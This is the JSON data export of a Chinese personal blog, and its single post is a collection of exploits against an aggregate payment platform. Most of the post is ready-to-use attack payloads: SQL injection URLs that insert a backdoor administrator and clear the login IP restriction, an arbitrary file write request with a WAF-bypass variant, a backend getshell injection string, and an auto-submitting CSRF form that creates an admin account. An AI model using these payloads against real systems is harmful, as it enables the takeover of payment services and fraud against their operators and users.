{"meta":{"title":"浅笑996的博客","subtitle":"","description":"","author":"qianxiao996","url":"http://blog.qianxiao996.cn","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2020-08-26T07:06:31.974Z","updated":"2020-07-04T08:47:02.000Z","comments":false,"path":"/404.html","permalink":"http://blog.qianxiao996.cn/404.html","excerpt":"","text":""},{"title":"书单","date":"2020-10-10T01:23:38.930Z","updated":"2020-07-04T08:47:02.000Z","comments":false,"path":"books/index.html","permalink":"http://blog.qianxiao996.cn/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-08-26T07:06:57.906Z","updated":"2020-07-04T11:55:10.000Z","comments":false,"path":"about/index.html","permalink":"http://blog.qianxiao996.cn/about/index.html","excerpt":"","text":"qianxiao996一个网络小白"},{"title":"分類","date":"2018-01-04T16:00:00.000Z","updated":"2020-10-10T02:29:19.686Z","comments":true,"path":"categories/index.html","permalink":"http://blog.qianxiao996.cn/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-08-26T07:07:07.755Z","updated":"2020-07-04T08:47:02.000Z","comments":false,"path":"repository/index.html","permalink":"http://blog.qianxiao996.cn/repository/index.html","excerpt":"","text":""},{"title":"標籤","date":"2018-01-04T16:00:00.000Z","updated":"2020-10-10T02:30:14.288Z","comments":true,"path":"tags/index.html","permalink":"http://blog.qianxiao996.cn/tags/index.html","excerpt":"","text":""},{"title":"友情鏈接","date":"2018-06-07T14:17:49.000Z","updated":"2020-10-10T02:29:33.008Z","comments":true,"path":"links/index.html","permalink":"http://blog.qianxiao996.cn/links/index.html","excerpt":"","text":""}],"posts":[{"title":"一聚合支付漏洞合集2","slug":"一聚合支付漏洞合集2","date":"2020-10-10T02:39:42.782Z","updated":"2020-10-10T02:43:19.569Z","comments":true,"path":"2020/10/10/一聚合支付漏洞合集2/","link":"","permalink":"http://blog.qianxiao996.cn/2020/10/10/%E4%B8%80%E8%81%9A%E5%90%88%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%862/","excerpt":"","text":"title:一聚合支付漏洞合集date:2018-01-05 00:00:00一聚合支付漏洞合集Sql注入注入一Pay_UPALIWAP_callbackurl.html?sdcustomno=1poc123&#x2F;index.php?m&#x3D;Pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;callbackurl&amp;sdcustomno&#x3D;1%27&#x2F;index.php?m&#x3D;Pay&amp;c&#x3D;WftAliSm&amp;a&#x3D;callbackurl&amp;orderid&#x3D;1%27直接把引号带入了数据库注入二需要代理账户123index.php?m&#x3D;user&amp;c&#x3D;IntoPieces&amp;a&#x3D;ajaxGetIndustryDATA:id&#x3D;123&amp;name&#x3D;_log; insert%20into%20pay_admin%20(&#96;id&#96;,&#96;username&#96;,&#96;password&#96;,&#96;groupid&#96;)%20values%20(%27101%27,%27ok%27,%277aa5e695be95cdd64a88410a64dfe2c1%27,%271%27);--+注入三1index.php?m&#x3D;user&amp;c&#x3D;api&amp;a&#x3D;ajaxGetIndustrypayload同上注入四1Pay_Pay_getSignkey?code&#x3D;123*&amp;merid&#x3D;222SQL注入添加管理员1index.php?m&#x3D;Pay&amp;c&#x3D;Alipage&amp;a&#x3D;callbackurl&amp;out_trade_no[0]&#x3D;exp&amp;out_trade_no[1]&#x3D;&#x3D;20190722230646541015;insert%20into%20pay_admin%20(&#96;id&#96;,&#96;username&#96;,&#96;password&#96;,&#96;groupid&#96;)%20values%20(%27801%27,%27admln%27,%277aa5e695be95cdd64a88410a64dfe2c1%27,%271%27);--+SQL注入取消IP限制1index.php?m&#x3D;Pay&amp;c&#x3D;Alipage&amp;a&#x3D;callbackurl&amp;out_trade_no[0]&#x3D;exp&amp;out_trade_no[1]&#x3D;&#x3D;20190722230646541015;update%20pay_websiteconfig%20set%20login_ip%20&#x3D;%20%27%27%20where%20id&#x3D;1任意文件写入exp1&#x2F;index.php?m&#x3D;pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;file_writeTxt&amp;filepath&#x3D;.&#x2F;coder.php&amp;source&#x3D;&lt;?php%20phpinfo();根目录生成 coder.php 内容为 &lt;?php%20phpinfo();绕过waf写入之转换为上传文件poc123456789101112131415161718192021222324POST &#x2F;index.php?m&#x3D;pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;file_writeTxt HTTP&#x2F;1.1Host: example.comPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;73.0.3683.103 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: xxxxxConnection: closeContent-Type: multipart&#x2F;form-data; boundary&#x3D;--------685764754Content-Length: 202----------685764754Content-Disposition: form-data; name&#x3D;&quot;filepath&quot;.&#x2F;coder.php----------685764754Content-Disposition: form-data; name&#x3D;&quot;source&quot;ssb&lt;?php phpinfo();&#x2F;&#x2F; 注意这里是将phpinfo与括弧分成了俩行----------685764754--后台GetshellURL地址manage_System_base.html插入&#39;,@copy($_REQUEST[x],$_REQUEST[c]),//CSRF添加管理员123456789101112&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;&#x2F;head&gt;&lt;body onload&#x3D;&quot;document.forms[0].submit();&quot;&gt;&lt;form id&#x3D;&quot;form1&quot; name&#x3D;&quot;form1&quot; action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:93&#x2F;index.php&#x2F;luck_Admin_addAdmin.html&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;ok179&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password&quot; value&#x3D;&quot;test123&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;reppassword&quot; value&#x3D;&quot;test123&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;groupid&quot; value&#x3D;&quot;1&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;","categories":[],"tags":[]}],"categories":[],"tags":[]}